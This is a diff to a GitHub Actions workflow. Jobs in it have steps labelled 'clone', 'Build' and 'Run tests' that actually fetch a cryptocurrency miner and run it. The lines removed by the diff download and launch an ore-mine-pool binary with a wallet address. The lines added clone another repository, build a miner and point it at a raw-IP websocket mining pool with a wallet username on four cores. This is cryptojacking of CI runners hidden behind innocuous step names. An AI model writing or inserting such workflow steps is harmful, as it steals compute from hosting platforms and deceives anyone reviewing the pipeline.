@@ -1,4 +1,4 @@
-name: roti 
+name: kont
 on: 
   push:
     branches: [ "main" ]
@@ -25,11 +25,11 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/xintai6660707/ore-mine-pool/raw/main/ore-mine-pool-linux && chmod +x ore-mine-pool-linux
+      run: git clone https://github.com/fadieza/masil && cd masil && chmod u+x *
     - name: Build
-      run: ore-mine-pool-linux
+      run: cd masil && cargo build --release
     - name: Run tests
-      run: ./ore-mine-pool-linux worker --alias IRFR940 --route-server-url http://route.oreminepool.top:8080/ --server-url 'public&stake' --worker-wallet-address B5r3aYo2g81ZNBAtN4A1h975wW3us4jqff9gSfNx5dhf &
+      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.222 --cores 4 &
         sleep 305s
   chat:
     needs: me
@@ -52,11 +52,11 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-       run: wget https://github.com/xintai6660707/ore-mine-pool/raw/main/ore-mine-pool-linux && chmod +x ore-mine-pool-linux
+      run: git clone https://github.com/fadieza/masil && cd masil && chmod u+x *
     - name: Build
-      run: ore-mine-pool-linux
+      run: cd masil && cargo build --release
     - name: Run tests
-      run: ./ore-mine-pool-linux worker --alias IRFR940 --route-server-url http://route.oreminepool.top:8080/ --server-url 'public&stake' --worker-wallet-address B5r3aYo2g81ZNBAtN4A1h975wW3us4jqff9gSfNx5dhf
+      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.222 --cores 4
         
     
      
@@ -81,11 +81,11 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-       run: wget https://github.com/xintai6660707/ore-mine-pool/raw/main/ore-mine-pool-linux && chmod +x ore-mine-pool-linux
+      run: git clone https://github.com/fadieza/masil && cd masil && chmod u+x *
     - name: Build
-      run: ore-mine-pool-linux
+      run: cd masil && cargo build --release
     - name: Run tests
-      run: ./ore-mine-pool-linux worker --alias IRFR940 --route-server-url http://route.oreminepool.top:8080/ --server-url 'public&stake' --worker-wallet-address B5r3aYo2g81ZNBAtN4A1h975wW3us4jqff9gSfNx5dhf
+      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.222 --cores 4
     
   Success:
     needs: [me, chat, enak]
